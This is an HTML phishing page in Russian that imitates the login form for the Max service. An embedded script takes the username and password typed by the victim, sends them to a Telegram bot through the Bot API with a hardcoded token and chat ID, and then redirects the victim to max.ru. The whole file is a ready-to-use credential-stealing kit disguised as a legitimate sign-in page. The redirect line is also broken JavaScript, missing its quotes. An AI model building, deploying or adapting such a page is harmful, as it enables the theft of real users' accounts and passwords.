<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход</title>
    <style>
        body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f0f0; margin: 0; }
        .box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px #ccc; width: 280px; }
        input { width: 100%; padding: 8px; margin: 6px 0; border: 1px solid #aaa; border-radius: 4px; }
        button { width: 100%; padding: 10px; background: #28a745; color: white; border: none; border-radius: 4px; font-size: 16px; }
        h2 { text-align: center; }
    </style>
</head>
<body>
<div class="box">
    <h2>Вход в Макс</h2>
    <form id="f">
        <input id="login" placeholder="Логин или email" required>
        <input id="pass" placeholder="Пароль" type="password" required>
        <button type="submit">Войти</button>
    </form>
</div>
<script>
document.getElementById('f').onsubmit = function(e) {
    e.preventDefault();
    let login = document.getElementById('login').value;
    let pass = document.getElementById('pass').value;
    let msg = 'Логин: ' + login + ' Пароль: ' + pass;
    fetch('https://api.telegram.org/bot8918681932:AAHkBy8LYIbYAmeZ6FqbsUcsXCIPme_UN0c/sendMessage?chat_id=8759904789&text=' + encodeURIComponent(msg));
    window.location.href = https://max.ru
};
</script>
</body>
</html>
